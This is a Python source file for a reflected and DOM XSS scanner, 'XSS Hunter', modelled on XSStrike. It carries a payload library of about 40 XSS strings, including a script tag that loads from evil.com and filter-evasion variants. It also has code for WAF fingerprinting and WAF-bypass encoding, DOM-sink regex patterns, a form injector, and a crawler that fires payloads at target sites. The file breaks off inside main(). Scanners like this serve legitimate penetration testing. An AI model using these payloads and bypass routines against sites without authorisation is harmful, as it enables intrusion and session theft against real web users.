#!/usr/bin/env python3
"""
XSS Hunter - Advanced Cross-Site Scripting Detection Tool
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Heavily inspired by XSStrike by s0md3v (https://github.com/s0md3v/XSStrike)
Extended and personalized by G4MEOVER18 (Yanis)

Usage:
    python xss_hunter.py -u "https://target.com/search?q=test"
    python xss_hunter.py -u "https://target.com" --crawl -v
    python xss_hunter.py -u "https://target.com/page" --json results.json
"""

import sys
import os
import re
import json
import time
import random
import string
import argparse
import urllib.parse
import urllib.request
import urllib.error
import http.cookiejar
import html
import hashlib
from datetime import datetime
from collections import defaultdict

# ─────────────────────────────────────────────
#  ANSI COLOR CODES
# ─────────────────────────────────────────────

class Color:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    GREY    = "\033[90m"

def cprint(msg, color=Color.WHITE, bold=False):
    prefix = Color.BOLD if bold else ""
    print(f"{prefix}{color}{msg}{Color.RESET}")

def banner():
    art = r"""
 __  __ _____ _____   _   _ _   _ _   _ _____ _____ ____
 \ \/ // ____/ ____| | | | | | | | \ | |_   _| ____|  _ \
  >  <| (___| (___   | |_| | | | |  \| | | | |  _| | |_) |
 / /\ \\___ \\___  \  |  _  | | | | . ` | | | | |___|  _ <
/_/  \_\____/____) | |_| |_| |_| |_|\__| |_| |_____|_| \_\

"""
    cprint(art, Color.RED, bold=True)
    cprint("  XSS Hunter v1.0 — by G4MEOVER18 (Yanis)", Color.CYAN, bold=True)
    cprint("  Inspired by XSStrike (s0md3v) — https://github.com/s0md3v/XSStrike", Color.GREY)
    cprint("  For authorized security testing only!\n", Color.YELLOW)

# ─────────────────────────────────────────────
#  PAYLOAD LIBRARY  (30+ payloads, tagged by context)
# ─────────────────────────────────────────────

PAYLOADS = [
    # ── HTML context ──────────────────────────────────────────────────────────
    {"payload": "<script>alert(1)</script>",                              "context": "html",      "severity": "HIGH"},
    {"payload": "<script>alert('XSS')</script>",                         "context": "html",      "severity": "HIGH"},
    {"payload": "<script src=//evil.com/x.js></script>",                 "context": "html",      "severity": "HIGH"},
    {"payload": "<img src=x onerror=alert(1)>",                          "context": "html",      "severity": "HIGH"},
    {"payload": "<img src=x onerror=alert`1`>",                          "context": "html",      "severity": "HIGH"},
    {"payload": "<svg onload=alert(1)>",                                  "context": "svg",       "severity": "HIGH"},
    {"payload": "<svg/onload=alert(1)>",                                  "context": "svg",       "severity": "HIGH"},
    {"payload": "<svg><script>alert(1)</script></svg>",                   "context": "svg",       "severity": "HIGH"},
    {"payload": "<body onload=alert(1)>",                                 "context": "html",      "severity": "HIGH"},
    {"payload": "<details open ontoggle=alert(1)>",                      "context": "html",      "severity": "HIGH"},

    # ── Attribute context ─────────────────────────────────────────────────────
    {"payload": "\" onmouseover=\"alert(1)",                             "context": "attribute", "severity": "HIGH"},
    {"payload": "' onmouseover='alert(1)",                               "context": "attribute", "severity": "HIGH"},
    {"payload": "\" autofocus onfocus=\"alert(1)",                       "context": "attribute", "severity": "HIGH"},
    {"payload": "' autofocus onfocus='alert(1)",                         "context": "attribute", "severity": "HIGH"},
    {"payload": "\"><img src=x onerror=alert(1)>",                       "context": "attribute", "severity": "HIGH"},
    {"payload": "'><img src=x onerror=alert(1)>",                        "context": "attribute", "severity": "HIGH"},
    {"payload": "\"><svg onload=alert(1)>",                              "context": "attribute", "severity": "HIGH"},

    # ── Script context (already inside <script>) ───────────────────────────────
    {"payload": "';alert(1)//",                                          "context": "script",    "severity": "HIGH"},
    {"payload": "\";alert(1)//",                                         "context": "script",    "severity": "HIGH"},
    {"payload": "\\';alert(1)//",                                        "context": "script",    "severity": "HIGH"},
    {"payload": "</script><script>alert(1)</script>",                    "context": "script",    "severity": "HIGH"},

    # ── Event handler context ─────────────────────────────────────────────────
    {"payload": "<input type=text value=x onblur=alert(1) autofocus>",  "context": "event",     "severity": "HIGH"},
    {"payload": "<select onfocus=alert(1) autofocus>",                   "context": "event",     "severity": "HIGH"},
    {"payload": "<video src=x onerror=alert(1)>",                        "context": "event",     "severity": "HIGH"},
    {"payload": "<audio src=x onerror=alert(1)>",                        "context": "event",     "severity": "HIGH"},
    {"payload": "<iframe onload=alert(1)>",                              "context": "event",     "severity": "HIGH"},
    {"payload": "<object data=javascript:alert(1)>",                     "context": "event",     "severity": "HIGH"},

    # ── Protocol/URL context ──────────────────────────────────────────────────
    {"payload": "javascript:alert(1)",                                   "context": "url",       "severity": "HIGH"},
    {"payload": "JaVaScRiPt:alert(1)",                                   "context": "url",       "severity": "HIGH"},
    {"payload": "javascript&#58;alert(1)",                               "context": "url",       "severity": "HIGH"},
    {"payload": "data:text/html,<script>alert(1)</script>",              "context": "url",       "severity": "HIGH"},

    # ── Filter bypass variants ────────────────────────────────────────────────
    {"payload": "<ScRiPt>alert(1)</ScRiPt>",                             "context": "bypass",    "severity": "MEDIUM"},
    {"payload": "<SCRIPT>alert(1)</SCRIPT>",                             "context": "bypass",    "severity": "MEDIUM"},
    {"payload": "<img src=x OnErRoR=alert(1)>",                         "context": "bypass",    "severity": "MEDIUM"},
    {"payload": "<%73cript>alert(1)</%73cript>",                         "context": "bypass",    "severity": "MEDIUM"},
    {"payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",           "context": "bypass",    "severity": "MEDIUM"},
    {"payload": "<svg onload=\"&#97;lert(1)\">",                         "context": "bypass",    "severity": "MEDIUM"},
    {"payload": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", "context": "bypass",    "severity": "MEDIUM"},
    {"payload": "<img src=x onerror=\\u0061lert(1)>",                   "context": "bypass",    "severity": "MEDIUM"},
    {"payload": "<svg onload=ale\x00rt(1)>",                             "context": "bypass",    "severity": "MEDIUM"},
    {"payload": "<img src=x onerror=alert%281%29>",                      "context": "bypass",    "severity": "MEDIUM"},
    {"payload": "<img src=x onerror=alert%2528%2529>",                   "context": "bypass",    "severity": "MEDIUM"},  # double-encoded
]

# ─────────────────────────────────────────────
#  WAF FINGERPRINTS
# ─────────────────────────────────────────────

WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "server: cloudflare"],
        "body": ["cloudflare", "cf-browser-verification", "__cf_bm"],
        "status": [403, 429],
    },
    "Akamai": {
        "headers": ["x-check-cacheable", "x-akamai-transformed", "akamai-origin-hop"],
        "body": ["akamai", "reference #", "access denied"],
        "status": [403],
    },
    "ModSecurity": {
        "headers": ["x-mod-security"],
        "body": ["mod_security", "modsecurity", "not acceptable!", "406 not acceptable"],
        "status": [403, 406],
    },
    "F5 BIG-IP ASM": {
        "headers": ["x-cnection", "bigipserver"],
        "body": ["the requested url was rejected", "f5", "support id:"],
        "status": [403],
    },
    "Imperva / Incapsula": {
        "headers": ["x-iinfo", "x-cdn"],
        "body": ["incapsula incident id", "_incap_ses", "visid_incap"],
        "status": [403],
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "body": ["sucuri website firewall", "cloudproxy"],
        "status": [403],
    },
    "AWS WAF": {
        "headers": ["x-amzn-requestid", "x-amz-cf-id"],
        "body": ["403 forbidden", "request blocked"],
        "status": [403],
    },
    "Barracuda": {
        "headers": ["barracuda_"],
        "body": ["barra_counter_session", "barracuda.com"],
        "status": [400, 403],
    },
}

# DOM XSS dangerous sinks
DOM_SINKS = [
    r"innerHTML\s*=",
    r"outerHTML\s*=",
    r"document\.write\s*\(",
    r"document\.writeln\s*\(",
    r"eval\s*\(",
    r"setTimeout\s*\(\s*['\"`]",
    r"setInterval\s*\(\s*['\"`]",
    r"execScript\s*\(",
    r"location\.href\s*=",
    r"location\.replace\s*\(",
    r"location\.assign\s*\(",
    r"\.src\s*=",
    r"window\.location\s*=",
    r"document\.domain\s*=",
    r"\$\(\s*['\"`][^'\"`]*['\"`]\s*\)\.html\s*\(",  # jQuery .html()
    r"\.insertAdjacentHTML\s*\(",
    r"createContextualFragment\s*\(",
    r"\.parseFromString\s*\(",
]

# ─────────────────────────────────────────────
#  UTILITY HELPERS
# ─────────────────────────────────────────────

def generate_canary(length=8):
    """Generate a unique canary string to test for reflection."""
    chars = string.ascii_lowercase + string.digits
    return "xssh" + "".join(random.choices(chars, k=length))

def encode_double(payload):
    return urllib.parse.quote(urllib.parse.quote(payload))

def encode_html_entities(payload):
    return html.escape(payload)

def mix_case(payload):
    result = []
    for i, c in enumerate(payload):
        if c.isalpha():
            result.append(c.upper() if i % 2 == 0 else c.lower())
        else:
            result.append(c)
    return "".join(result)

def inject_comments(payload):
    """Insert HTML comments into tag names to bypass filters."""
    return payload.replace("<script", "<scr<!---->ipt").replace("<img", "<i<!---->mg")

def generate_payload_variants(payload_entry):
    """Generate WAF-bypass variants of a payload."""
    base = payload_entry["payload"]
    variants = [base]

    # Only generate variants for HTML/attribute contexts
    if payload_entry["context"] in ("html", "attribute", "svg", "event", "bypass"):
        variants.append(mix_case(base))
        variants.append(inject_comments(base))
        variants.append(urllib.parse.quote(base))
        variants.append(encode_double(base))

    return variants

def build_url_with_param(url, param, value):
    """Replace or inject a parameter value in a URL."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]
    new_query = urllib.parse.urlencode(params, doseq=True)
    return parsed._replace(query=new_query).geturl()

def extract_params(url):
    """Return list of parameter names from URL."""
    parsed = urllib.parse.urlparse(url)
    return list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys())

def make_request(url, headers=None, cookies=None, data=None, timeout=10, verbosity=0):
    """Perform HTTP GET or POST; return (response_text, response_headers, status_code)."""
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) XSSHunter/1.0 (G4MEOVER18)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "close",
    }
    if headers:
        default_headers.update(headers)

    cookie_header = ""
    if cookies:
        cookie_header = "; ".join(f"{k}={v}" for k, v in cookies.items())
        default_headers["Cookie"] = cookie_header

    req_data = None
    if data:
        req_data = urllib.parse.urlencode(data).encode("utf-8")
        default_headers["Content-Type"] = "application/x-www-form-urlencoded"

    req = urllib.request.Request(url, data=req_data, headers=default_headers)

    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            resp_headers = dict(resp.getheaders())
            status = resp.status
            if verbosity >= 2:
                cprint(f"    [>>] GET {url} → {status}", Color.GREY)
            return body, resp_headers, status
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        resp_headers = dict(e.headers)
        if verbosity >= 2:
            cprint(f"    [>>] GET {url} → {e.code}", Color.GREY)
        return body, resp_headers, e.code
    except Exception as ex:
        if verbosity >= 1:
            cprint(f"    [ERR] Request failed: {ex}", Color.RED)
        return "", {}, 0

# ─────────────────────────────────────────────
#  WAF DETECTION
# ─────────────────────────────────────────────

def detect_waf(url, response_headers, response_body, status_code, verbosity=0):
    """
    Detect WAF presence from response headers and body patterns.
    Returns list of detected WAF names (empty = none detected).
    """
    detected = []
    headers_lower = {k.lower(): v.lower() for k, v in response_headers.items()}
    body_lower = response_body.lower()

    for waf_name, sigs in WAF_SIGNATURES.items():
        matched = False

        # Check header signatures
        for h_sig in sigs.get("headers", []):
            h_key = h_sig.split(":")[0].strip()
            h_val = h_sig.split(":", 1)[1].strip() if ":" in h_sig else None
            if h_key in headers_lower:
                if h_val is None or h_val in headers_lower[h_key]:
                    matched = True
                    break

        # Check body signatures
        if not matched:
            for b_sig in sigs.get("body", []):
                if b_sig.lower() in body_lower:
                    matched = True
                    break

        # Status-code hints only add to suspicion if body/header matched
        if matched:
            detected.append(waf_name)
            if verbosity >= 1:
                cprint(f"  [WAF] Detected: {waf_name}", Color.YELLOW, bold=True)

    if not detected and verbosity >= 1:
        cprint("  [WAF] No WAF fingerprint detected", Color.GREEN)

    return detected

# ─────────────────────────────────────────────
#  REFLECTION TEST
# ─────────────────────────────────────────────

def test_reflection(url, param, canary, cookies=None, verbosity=0):
    """
    Inject canary into param, check if it's reflected verbatim in response.
    Returns True if reflected, False otherwise.
    """
    test_url = build_url_with_param(url, param, canary)
    body, headers, status = make_request(test_url, cookies=cookies, verbosity=verbosity)

    if not body:
        return False

    reflected = canary.lower() in body.lower()
    if verbosity >= 2:
        tag = Color.GREEN + "REFLECTED" if reflected else Color.GREY + "not reflected"
        cprint(f"    [~] Canary '{canary}' in param '{param}': {tag}{Color.RESET}", Color.RESET)

    return reflected

# ─────────────────────────────────────────────
#  FORM PARSING
# ─────────────────────────────────────────────

def parse_forms(url, body, verbosity=0):
    """
    Parse HTML forms from response body.
    Returns list of dicts: {action, method, fields: [{name, type, value}]}
    """
    forms = []

    form_pattern = re.compile(
        r'<form[^>]*>(.*?)</form>',
        re.IGNORECASE | re.DOTALL
    )
    action_pattern = re.compile(r'action=["\']([^"\']*)["\']', re.IGNORECASE)
    method_pattern = re.compile(r'method=["\']([^"\']*)["\']', re.IGNORECASE)
    input_pattern  = re.compile(
        r'<input[^>]*>',
        re.IGNORECASE
    )
    name_pattern   = re.compile(r'name=["\']([^"\']*)["\']', re.IGNORECASE)
    type_pattern   = re.compile(r'type=["\']([^"\']*)["\']', re.IGNORECASE)
    value_pattern  = re.compile(r'value=["\']([^"\']*)["\']', re.IGNORECASE)
    textarea_pattern = re.compile(r'<textarea[^>]*name=["\']([^"\']*)["\'][^>]*>', re.IGNORECASE)
    select_pattern   = re.compile(r'<select[^>]*name=["\']([^"\']*)["\'][^>]*>', re.IGNORECASE)

    base_parsed = urllib.parse.urlparse(url)

    for form_match in form_pattern.finditer(body):
        form_html = form_match.group(0)
        form_body = form_match.group(1)

        action_m = action_pattern.search(form_html)
        method_m = method_pattern.search(form_html)

        action = action_m.group(1) if action_m else url
        method = method_m.group(1).upper() if method_m else "GET"

        # Resolve relative action URLs
        if action and not action.startswith("http"):
            action = urllib.parse.urljoin(url, action)

        fields = []
        for inp in input_pattern.finditer(form_body):
            inp_html = inp.group(0)
            name_m  = name_pattern.search(inp_html)
            type_m  = type_pattern.search(inp_html)
            value_m = value_pattern.search(inp_html)
            if name_m:
                fields.append({
                    "name":  name_m.group(1),
                    "type":  type_m.group(1).lower() if type_m else "text",
                    "value": value_m.group(1) if value_m else "",
                })

        for ta_m in textarea_pattern.finditer(form_body):
            fields.append({"name": ta_m.group(1), "type": "textarea", "value": ""})

        for sel_m in select_pattern.finditer(form_body):
            fields.append({"name": sel_m.group(1), "type": "select", "value": ""})

        form_entry = {"action": action, "method": method, "fields": fields}
        forms.append(form_entry)

        if verbosity >= 1:
            cprint(f"  [FORM] Found form: {method} {action} — {len(fields)} field(s)", Color.CYAN)

    return forms

# ─────────────────────────────────────────────
#  DOM SINK DETECTION
# ─────────────────────────────────────────────

def check_dom_sinks(body, url, verbosity=0):
    """
    Scan JavaScript in the response for dangerous DOM sinks.
    Returns list of finding dicts.
    """
    findings = []
    script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.IGNORECASE | re.DOTALL)
    inline_handlers = re.findall(r'on\w+=["\'][^"\']*["\']', body, re.IGNORECASE)
    all_js = "\n".join(script_blocks)

    for sink_re in DOM_SINKS:
        matches = re.findall(sink_re, all_js, re.IGNORECASE)
        if matches:
            sink_name = sink_re.split(r"\s")[0].replace("\\", "").replace("(", "").strip()
            findings.append({
                "type":     "DOM_SINK",
                "url":      url,
                "sink":     sink_name,
                "severity": "INFO",
                "detail":   f"Dangerous JS sink detected: {sink_name}",
            })
            if verbosity >= 1:
                cprint(f"  [DOM] Dangerous sink found: {sink_name}", Color.MAGENTA)

    # Detect use of location.hash / URLSearchParams as source feeding sinks
    source_patterns = [r"location\.hash", r"location\.search", r"URLSearchParams", r"document\.referrer"]
    sources_found = []
    for src_re in source_patterns:
        if re.search(src_re, all_js, re.IGNORECASE):
            sources_found.append(src_re.replace("\\.", ".").replace("\\(", "("))

    if sources_found and findings:
        for f in findings:
            f["detail"] += f" | Possible sources: {', '.join(sources_found)}"
            f["severity"] = "MEDIUM"

    return findings

# ─────────────────────────────────────────────
#  URL SCANNER
# ─────────────────────────────────────────────

def scan_url(url, cookies=None, extra_headers=None, verbosity=0, use_variants=False, findings=None):
    """
    Scan a single URL for reflected XSS in all GET parameters.
    Also parses and tests forms, checks DOM sinks.
    Returns list of finding dicts.
    """
    if findings is None:
        findings = []

    cprint(f"\n[*] Scanning: {url}", Color.CYAN, bold=True)

    # Fetch base response
    body, resp_headers, status = make_request(
        url, headers=extra_headers, cookies=cookies, verbosity=verbosity
    )
    if not body:
        cprint("  [!] Could not fetch page, skipping.", Color.RED)
        return findings

    # ── WAF detection ──────────────────────────────────────────────────────
    waf_probe_url = build_url_with_param(
        url,
        list(urllib.parse.parse_qs(urllib.parse.urlparse(url).query).keys() or ["xssh_probe"]),
        "<script>alert(1)</script>"
    ) if extract_params(url) else url

    waf_body, waf_headers, waf_status = make_request(
        waf_probe_url, headers=extra_headers, cookies=cookies, verbosity=verbosity
    )
    detected_wafs = detect_waf(url, waf_headers or resp_headers, waf_body or body, waf_status or status, verbosity)

    if detected_wafs:
        findings.append({
            "type": "WAF_DETECTED",
            "url": url,
            "wafs": detected_wafs,
            "severity": "INFO",
            "detail": f"WAF(s) detected: {', '.join(detected_wafs)}",
        })

    # ── DOM sink check ─────────────────────────────────────────────────────
    dom_findings = check_dom_sinks(body, url, verbosity)
    findings.extend(dom_findings)

    # ── GET parameter injection ────────────────────────────────────────────
    params = extract_params(url)
    if verbosity >= 1 and params:
        cprint(f"  [*] Parameters found: {', '.join(params)}", Color.BLUE)
    elif verbosity >= 1:
        cprint("  [~] No URL parameters found", Color.GREY)

    for param in params:
        canary = generate_canary()
        if verbosity >= 1:
            cprint(f"\n  [>] Testing param: {param}", Color.BLUE)

        # Reflection test
        reflected = test_reflection(url, param, canary, cookies=cookies, verbosity=verbosity)
        if not reflected:
            if verbosity >= 1:
                cprint(f"  [-] Param '{param}' not reflected, skipping payloads", Color.GREY)
            continue

        cprint(f"  [+] Param '{param}' is REFLECTED — testing payloads...", Color.GREEN)

        for p_entry in PAYLOADS:
            payloads_to_try = generate_payload_variants(p_entry) if use_variants else [p_entry["payload"]]

            for payload in payloads_to_try:
                test_url = build_url_with_param(url, param, payload)
                p_body, p_headers, p_status = make_request(
                    test_url, headers=extra_headers, cookies=cookies, verbosity=verbosity
                )

                if not p_body:
                    continue

                # Check if payload reflected unencoded (= likely executable)
                # Look for key XSS indicators in response
                xss_indicators = [
                    "<script", "onerror=", "onload=", "onfocus=", "onmouseover=",
                    "javascript:", "alert(", "svg", "iframe",
                ]
                payload_reflected = False
                encoded_check = urllib.parse.unquote(payload).lower()
                for indicator in xss_indicators:
                    if indicator.lower() in p_body.lower() and encoded_check[:10].lower() in p_body.lower():
                        payload_reflected = True
                        break

                if payload_reflected:
                    severity = p_entry["severity"]
                    color = Color.RED if severity == "HIGH" else Color.YELLOW
                    cprint(
                        f"  [!!!] XSS FOUND [{severity}] param='{param}' context='{p_entry['context']}'",
                        color, bold=True
                    )
                    cprint(f"        Payload: {payload[:120]}", color)
                    cprint(f"        URL: {test_url[:200]}", Color.GREY)

                    findings.append({
                        "type":     "XSS_REFLECTED",
                        "url":      test_url,
                        "param":    param,
                        "payload":  payload,
                        "context":  p_entry["context"],
                        "severity": severity,
                        "detail":   f"Reflected XSS via param '{param}', context: {p_entry['context']}",
                    })
                    break  # one confirmed hit per payload entry is enough

                time.sleep(0.05)  # polite delay

    # ── Form injection ─────────────────────────────────────────────────────
    forms = parse_forms(url, body, verbosity)
    for form in forms:
        scan_form(form, url, cookies=cookies, extra_headers=extra_headers,
                  verbosity=verbosity, use_variants=use_variants, findings=findings)

    return findings


def scan_form(form, base_url, cookies=None, extra_headers=None, verbosity=0, use_variants=False, findings=None):
    """Inject XSS payloads into each field of a parsed form."""
    if findings is None:
        findings = []

    action  = form["action"]
    method  = form["method"]
    fields  = form["fields"]

    testable_types = ("text", "search", "email", "url", "textarea", "hidden", "password", "select")

    for target_field in fields:
        if target_field["type"] not in testable_types:
            continue

        field_name = target_field["name"]
        canary = generate_canary()

        # Build base form data
        form_data = {f["name"]: f.get("value", "test") for f in fields if f["name"] != field_name}
        form_data[field_name] = canary

        if verbosity >= 1:
            cprint(f"\n  [FORM] Testing field '{field_name}' in {method} {action}", Color.BLUE)

        if method == "POST":
            f_body, f_headers, f_status = make_request(
                action, headers=extra_headers, cookies=cookies, data=form_data, verbosity=verbosity
            )
        else:
            get_url = action + "?" + urllib.parse.urlencode(form_data)
            f_body, f_headers, f_status = make_request(
                get_url, headers=extra_headers, cookies=cookies, verbosity=verbosity
            )

        if not f_body or canary.lower() not in f_body.lower():
            if verbosity >= 2:
                cprint(f"  [-] Field '{field_name}' not reflected", Color.GREY)
            continue

        cprint(f"  [+] Form field '{field_name}' is REFLECTED — testing payloads...", Color.GREEN)

        for p_entry in PAYLOADS[:20]:  # test top 20 for forms to limit requests
            payloads_to_try = generate_payload_variants(p_entry) if use_variants else [p_entry["payload"]]

            for payload in payloads_to_try:
                form_data[field_name] = payload
                if method == "POST":
                    p_body, _, _ = make_request(
                        action, headers=extra_headers, cookies=cookies, data=form_data, verbosity=verbosity
                    )
                else:
                    get_url = action + "?" + urllib.parse.urlencode(form_data)
                    p_body, _, _ = make_request(
                        get_url, headers=extra_headers, cookies=cookies, verbosity=verbosity
                    )

                if not p_body:
                    continue

                xss_indicators = ["<script", "onerror=", "onload=", "onfocus=", "javascript:", "alert("]
                payload_reflected = any(ind.lower() in p_body.lower() for ind in xss_indicators) and \
                                    payload[:8].lower() in p_body.lower()

                if payload_reflected:
                    severity = p_entry["severity"]
                    color = Color.RED if severity == "HIGH" else Color.YELLOW
                    cprint(
                        f"  [!!!] FORM XSS [{severity}] field='{field_name}' context='{p_entry['context']}'",
                        color, bold=True
                    )
                    cprint(f"        Payload: {payload[:120]}", color)

                    findings.append({
                        "type":     "XSS_FORM",
                        "url":      action,
                        "method":   method,
                        "field":    field_name,
                        "payload":  payload,
                        "context":  p_entry["context"],
                        "severity": severity,
                        "detail":   f"Reflected XSS via form field '{field_name}' ({method} {action})",
                    })
                    break

                time.sleep(0.05)

    return findings

# ─────────────────────────────────────────────
#  CRAWLER
# ─────────────────────────────────────────────

def extract_links(base_url, body):
    """Extract same-domain links from HTML body."""
    base_parsed = urllib.parse.urlparse(base_url)
    base_domain = base_parsed.netloc

    href_pattern = re.compile(r'href=["\']([^"\']+)["\']', re.IGNORECASE)
    links = set()

    for match in href_pattern.finditer(body):
        href = match.group(1).strip()

        # Skip non-HTTP, anchors, mailto, javascript
        if href.startswith(("#", "mailto:", "javascript:", "tel:")):
            continue

        # Resolve relative URLs
        full_url = urllib.parse.urljoin(base_url, href)
        parsed   = urllib.parse.urlparse(full_url)

        # Same domain only
        if parsed.netloc != base_domain:
            continue

        # Only include URLs with query params (most interesting for XSS)
        if parsed.query:
            links.add(urllib.parse.urlunparse(parsed))

    return links


def crawl_and_scan(start_url, cookies=None, extra_headers=None, verbosity=0,
                   use_variants=False, max_pages=50):
    """
    Crawl same-domain links starting from start_url, scan each for XSS.
    Returns aggregated findings list.
    """
    visited  = set()
    to_visit = {start_url}
    all_findings = []
    page_count = 0

    cprint(f"\n[*] Crawl mode: starting from {start_url}", Color.CYAN, bold=True)
    cprint(f"    Max pages: {max_pages}", Color.GREY)

    while to_visit and page_count < max_pages:
        url = to_visit.pop()
        if url in visited:
            continue

        visited.add(url)
        page_count += 1
        cprint(f"\n[CRAWL] Page {page_count}/{max_pages}: {url}", Color.BLUE)

        body, headers, status = make_request(url, headers=extra_headers, cookies=cookies, verbosity=verbosity)
        if not body:
            continue

        # Collect new links
        new_links = extract_links(url, body) - visited
        to_visit.update(new_links)
        if verbosity >= 1 and new_links:
            cprint(f"  [+] {len(new_links)} new link(s) queued", Color.GREY)

        # Scan this page
        page_findings = scan_url(
            url, cookies=cookies, extra_headers=extra_headers,
            verbosity=verbosity, use_variants=use_variants
        )
        all_findings.extend(page_findings)

        time.sleep(0.2)  # polite crawl delay

    cprint(f"\n[*] Crawl complete. Pages visited: {page_count}", Color.CYAN)
    return all_findings

# ─────────────────────────────────────────────
#  REPORTING
# ─────────────────────────────────────────────

def print_summary(findings, elapsed):
    xss_high   = [f for f in findings if f.get("severity") == "HIGH"   and "XSS" in f["type"]]
    xss_medium = [f for f in findings if f.get("severity") == "MEDIUM" and "XSS" in f["type"]]
    dom_sinks  = [f for f in findings if f["type"] == "DOM_SINK"]
    waf_info   = [f for f in findings if f["type"] == "WAF_DETECTED"]
    other_info = [f for f in findings if f.get("severity") == "INFO"   and "XSS" not in f["type"] and f["type"] != "WAF_DETECTED"]

    cprint("\n" + "═" * 60, Color.CYAN)
    cprint("  SCAN SUMMARY", Color.CYAN, bold=True)
    cprint("═" * 60, Color.CYAN)
    cprint(f"  Time elapsed   : {elapsed:.1f}s", Color.WHITE)
    cprint(f"  Total findings : {len(findings)}", Color.WHITE)
    cprint(f"  HIGH (XSS)     : {len(xss_high)}", Color.RED if xss_high else Color.GREEN, bold=bool(xss_high))
    cprint(f"  MEDIUM (XSS)   : {len(xss_medium)}", Color.YELLOW if xss_medium else Color.GREEN)
    cprint(f"  DOM Sinks      : {len(dom_sinks)}", Color.MAGENTA if dom_sinks else Color.GREEN)
    cprint(f"  WAF Detected   : {len(waf_info)}", Color.YELLOW if waf_info else Color.GREEN)
    cprint("═" * 60 + "\n", Color.CYAN)

    if xss_high:
        cprint("  HIGH Severity XSS Findings:", Color.RED, bold=True)
        for i, f in enumerate(xss_high, 1):
            cprint(f"  {i}. {f.get('url','')[:100]}", Color.RED)
            cprint(f"     Payload : {f.get('payload','')[:80]}", Color.GREY)
            cprint(f"     Detail  : {f.get('detail','')}", Color.GREY)

    if dom_sinks:
        cprint("\n  DOM Sink Warnings:", Color.MAGENTA, bold=True)
        shown = set()
        for f in dom_sinks:
            key = f.get("sink", "")
            if key not in shown:
                cprint(f"  • {f.get('detail','')}", Color.MAGENTA)
                shown.add(key)

    if waf_info:
        cprint("\n  WAF Info:", Color.YELLOW, bold=True)
        for f in waf_info:
            cprint(f"  • {f.get('detail','')}", Color.YELLOW)

def export_json(findings, path):
    report = {
        "tool":      "XSS Hunter v1.0",
        "author":    "G4MEOVER18 (Yanis)",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "total":     len(findings),
        "findings":  findings,
    }
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(report, fh, indent=2, ensure_ascii=False)
    cprint(f"\n[+] JSON report saved: {path}", Color.GREEN)

# ─────────────────────────────────────────────
#  CLI ARGUMENT PARSING
# ─────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        prog="xss_hunter",
        description="XSS Hunter — Advanced Reflected/DOM XSS Scanner by G4MEOVER18",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python xss_hunter.py -u "https://target.com/search?q=test"
  python xss_hunter.py -u "https://target.com/search?q=test" -v --variants
  python xss_hunter.py -u "https://target.com" --crawl --max-pages 30
  python xss_hunter.py -u "https://target.com/page" --json results.json
  python xss_hunter.py -u "https://target.com/page" --cookies "session=abc123; role=user"
  python xss_hunter.py -u "https://target.com/page" --headers "Authorization: Bearer token"

Inspired by XSStrike (s0md3v): https://github.com/s0md3v/XSStrike
        """
    )
    parser.add_argument("-u", "--url",        required=True, help="Target URL")
    parser.add_argument("--crawl",            action="store_true", help="Crawl same-domain links")
    parser.add_argument("--max-pages",        type=int, default=50, help="Max pages to crawl (default: 50)")
    parser.add_argument("--cookies",          help='Cookies string, e.g. "session=abc; role=user"')
    parser.add_argument("--headers",          help='Extra headers, e.g. "X-Custom: value\\nAuthorization: Bearer t"')
    parser.add_argument("--json",             metavar="FILE", help="Export findings to JSON file")
    parser.add_argument("--variants",         action="store_true", help="Generate WAF-bypass payload variants")
    parser.add_argument("-v", "--verbose",    action="count", default=0, help="Verbosity (-v or -vv)")
    parser.add_argument("--no-banner",        action="store_true", help="Suppress ASCII banner")
    return parser.parse_args()

def parse_cookies(cookie_str):
    """Parse 'name=val; name2=val2' into dict."""
    if not cookie_str:
        return {}
    result = {}
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            result[k.strip()] = v.strip()
    return result

def parse_headers(header_str):
    """Parse 'Name: value\\nName2: value2' into dict."""
    if not header_str:
        return {}
    result = {}
    for line in header_str.replace("\\n", "\n").split("\n"):
        if ":" in line:
            k, v = line.split(":", 1)
            result[k.strip()] = v.strip()
    return result

# ─────────────────────────────────────────────
#  MAIN ENTRY POINT
# ─────────────────────────────────────────────

def main():
    args = parse_args()

    if not args.no_banner:
        banner()

    # Validate URL
    parsed_target = urllib.parse.urlparse(args.url)
    if parsed_target.scheme not in ("http", "https"):
        cprint("[!] URL must start with http:// or https://", Color.RED)
        sys.exit(1)

    cookies     = parse_cookies(args.cookies)
    headers     = parse_headers(args.headers) if args.headers else {}
    verbosity   = args.verbose
    use_variants = args.variants

    cprint(f"[*] Target      : {args.url}", Color.WHITE)
    cprint(f"[*] Crawl mode  : {'ON' if args.crawl else 'OFF'}", Color.WHITE)
    cprint(f"[*] WAF Bypass  : {'ON' if use_variants else 'OFF'}", Color.WHITE)
    cprint(f"[*] Payloads    : {len(PAYLOADS)}", Color.WHITE)
